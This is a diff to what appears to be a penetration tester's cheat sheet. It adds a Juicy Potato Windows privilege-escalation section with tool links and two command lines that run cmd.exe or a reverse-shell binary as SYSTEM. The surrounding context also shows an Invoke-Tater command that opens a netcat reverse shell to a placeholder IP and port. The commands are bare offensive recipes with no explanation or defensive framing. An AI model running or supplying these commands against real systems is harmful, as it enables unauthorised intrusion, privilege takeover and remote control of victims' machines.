@@ -643,5 +643,15 @@ https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1
 3. Invoke-Tater -Trigger 1 -Command "nc <IP> <PORT> -e 'cmd'"
 ```
 
+### [privesc via juicy potato]
+https://github.com/ohpe/juicy-potato  
+https://github.com/ohpe/juicy-potato/releases  
+https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato  
+https://ohpe.it/juicy-potato/CLSID/  
+```
+.\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
+.\juicypotato.exe -l 1337 -p c:\test\revshell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
+```
+
 ### lolbins
 https://lolbas-project.github.io/lolbas/Binaries/Certreq/
